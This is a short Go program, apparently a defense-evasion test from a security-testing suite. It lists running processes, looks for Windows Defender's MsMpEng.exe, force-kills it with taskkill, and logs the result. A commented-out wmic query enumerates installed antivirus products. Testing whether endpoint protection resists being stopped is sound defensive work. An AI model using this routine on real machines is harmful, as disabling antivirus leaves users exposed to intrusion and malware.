package main

import (
	"helpers"
	"os"
	"os/exec"
	"strings"
)

type AVEDRExe struct {
	name string
	exe  string
}

var AVEDRExecs = []AVEDRExe{AVEDRExe{"Windows Defender", "MsMpEng.exe"}}

func checkIfItIsAVEDR(name string) bool {
	for i := 0; i < len(AVEDRExecs); i++ {
		if AVEDRExecs[i].exe == name {
			return true
		}
	}

	return false
}

func main() {
	/*getAVEDR := exec.Command("wmic", "/node:localhost", "/namespace:\\root\\SecurityCenter2", "path", "AntiVirusProduct", "Get", "DisplayName")
	AVEDRoutput, err := getAVEDR.Output()
	if err != nil {
		fmt.Println(err.Error())
	}
	listOfAVEDR := strings.Split(string(AVEDRoutput), "\n")
	for i := 0; i < len(listOfAVEDR); i++ {
		fmt.Println(listOfAVEDR[i])
	}*/

	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "DefenseEnvasion")
	helpers.WriteLog(nameOfLogFile, "Starting test: DefenseEnvasion", 2)

	getProcesses := exec.Command("tasklist")
	processes, err := getProcesses.Output()
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(2)
	}

	processInfo := strings.Split(string(processes), "\n")
	var AVEDRprocess []string
	for i := 3; i < len(processInfo); i++ {
		processFileds := strings.Fields(processInfo[i])
		if len(processFileds) > 0 {
			name := processFileds[0]
			if checkIfItIsAVEDR(name) {
				AVEDRprocess = append(AVEDRprocess, name)
			}
		}

	}

	for i := 0; i < len(AVEDRprocess); i++ {
		stopAVEDR := exec.Command("taskkill", "/IM", AVEDRprocess[i], "/F")
		_, err := stopAVEDR.Output()
		if err != nil {
			if err.Error() == "exit status 1" {
				os.Exit(1)
			} else {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
				os.Exit(3)
			}
		}
	}

	helpers.WriteLog(nameOfLogFile, "Ending test: DefenseEnvasion", 2)
	os.Exit(0)

}
